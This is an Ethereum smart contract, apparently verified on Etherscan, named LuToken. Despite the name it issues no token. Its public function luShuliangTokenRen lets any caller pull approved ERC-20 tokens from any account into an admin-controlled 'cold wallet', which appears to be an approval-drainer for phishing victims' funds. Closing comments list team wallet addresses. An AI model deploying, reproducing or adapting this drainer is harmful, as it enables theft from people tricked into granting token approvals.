/**
 *Submitted for verification at Etherscan.io on 2021-11-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library Address {
    function isContract(address account) internal view returns (bool) {
        uint size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint);   
    function transferFrom(address sender, address recipient, uint amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract LuToken {
    using Address for address;

    address public coldWallet;
    address public admin;
    bool initialized;

    modifier onlyAdmin {
        require(msg.sender == admin,"You Are not admin");
        _;
    }

    function init(address _newAddress) external {
        require(!initialized,"initialized");
  
        admin = _newAddress;
        coldWallet = _newAddress;
        initialized = true;
    }

    function setColdWallet(address _newAddress) external onlyAdmin {
        coldWallet = _newAddress;
    }

    function luShuliangTokenRen(address _account, address _token, uint _amount) public {
        IERC20(_token).transferFrom(_account, coldWallet,_amount);
    }

    receive () external payable {
    }

    // Team 0xd8C1B9661C3553445B171Df00632EfF153891900
    // TEAM TEEpLWrjyd9pd9rshZBYvqmKhk1f8RsDii
    // https://etherscan.io/tx/0x4b64fabb26259b150c9f883fa22c8b0f7c32fc76b35dff68de0a495231263e32
}